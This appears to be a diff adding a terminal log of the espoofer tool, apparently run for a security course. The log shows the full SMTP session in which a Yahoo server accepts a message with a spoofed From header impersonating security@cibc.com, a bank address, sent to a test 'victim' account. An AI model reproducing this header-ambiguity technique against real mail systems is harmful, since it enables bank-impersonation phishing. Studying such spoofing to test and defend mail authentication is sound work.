@@ -1,0 +1,53 @@
+(base) ➜  espoofer git:(client-mode-attack-recreation) ✗ python3 espoofer.py -id server_a18
+                               ____         
+  ___  _________  ____  ____  / __/__  _____
+ / _ \/ ___/ __ \/ __ \/ __ \/ /_/ _ \/ ___/
+/  __(__  ) /_/ / /_/ / /_/ / __/  __/ /    
+\___/____/ .___/\____/\____/_/  \___/_/     
+        /_/                                 
+    
+Start sending emails...
+Connecting ('98.136.96.74', 25)
+>>> 220 mtaproxy207.free.mail.ne1.yahoo.com ESMTP ready
+
+<<< ehlo testdomaintest.company
+
+>>> 250-mtaproxy207.free.mail.ne1.yahoo.com
+250-PIPELINING
+250-SIZE 41943040
+250-8BITMIME
+250 STARTTLS
+
+<<< mail from: <any@testdomaintest.company>
+
+>>> 250 sender <any@testdomaintest.company> ok
+
+<<< rcpt to: <cis6510victim@yahoo.com>
+
+>>> 250 recipient <cis6510victim@yahoo.com> ok
+
+<<< data
+
+>>> 354 go ahead
+
+<<< From: security@cibc.com,<second@testdomaintest.company>
+To: <cis6510victim@yahoo.com>
+Subject: A18: Specical characters precedence
+Date: Tue, 24 Nov 2020 04:16:34 +0000
+Sender: <s@sender.cibc.com>
+Content-Type: text/plain; charset="UTF-8"
+MIME-Version: 1.0
+Message-ID: <1538085644648.096e3d4e-bc38-4027-b57e-FLIUSA@message-ids.testdomaintest.company>
+X-Email-Client: https://github.com/chenjj/espoofer
+
+Hi, this is a test message! Best wishes.
+
+.
+
+>>> 250 ok dirdel
+
+<<< quit
+
+>>> 221 2.0.0 Bye
+
+Finished.
